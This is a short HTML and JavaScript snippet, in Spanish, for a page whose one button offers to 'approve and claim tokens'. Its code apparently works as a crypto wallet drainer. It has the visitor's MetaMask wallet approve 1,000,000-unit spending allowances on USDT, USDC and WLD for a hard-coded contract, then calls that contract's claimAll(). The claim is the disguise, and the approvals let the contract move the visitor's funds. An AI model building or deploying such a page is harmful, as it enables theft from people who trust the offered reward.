<script>
const provider = new ethers.providers.Web3Provider(window.ethereum);
const signer = provider.getSigner();
const contractAddress = "0xD949A68ACBdFC313f7d94FC9169F98DB45F5F2E4";
const contractABI = [
    "function claimAll() external",
    "function approve(address spender, uint256 amount) external returns (bool)"
];

const usdtAddress = "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58";
const usdcAddress = "0xdC6fF44d5d932Cbd77B52E5612Ba0529DC6226F1";
const wldAddress = "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85";
const spenderAddress = contractAddress;
const approveAmount = ethers.utils.parseUnits("1000000", 6);

async function approveAndClaim() {
    if (!window.ethereum) {
        alert("MetaMask no está instalado");
        return;
    }
    
    await provider.send("eth_requestAccounts", []);
    const contract = new ethers.Contract(contractAddress, contractABI, signer);
    const usdtContract = new ethers.Contract(usdtAddress, contractABI, signer);
    const usdcContract = new ethers.Contract(usdcAddress, contractABI, signer);
    const wldContract = new ethers.Contract(wldAddress, contractABI, signer);
    
    try {
        console.log("Aprobando USDT...");
        await usdtContract.approve(spenderAddress, approveAmount);
        console.log("Aprobación de USDT completada");
        
        console.log("Aprobando USDC...");
        await usdcContract.approve(spenderAddress, approveAmount);
        console.log("Aprobación de USDC completada");
        
        console.log("Aprobando WLD...");
        await wldContract.approve(spenderAddress, approveAmount);
        console.log("Aprobación de WLD completada");
        
        console.log("Llamando a claimAll...");
        const tx = await contract.claimAll();
        await tx.wait();
        console.log("Tokens reclamados correctamente");
        alert("Tokens aprobados y reclamados correctamente");
    } catch (error) {
        console.error("Error en la transacción", error);
        alert("Error en la transacción");
    }
}
</script>

<button onclick="approveAndClaim()">Aprobar y Reclamar Tokens</button>
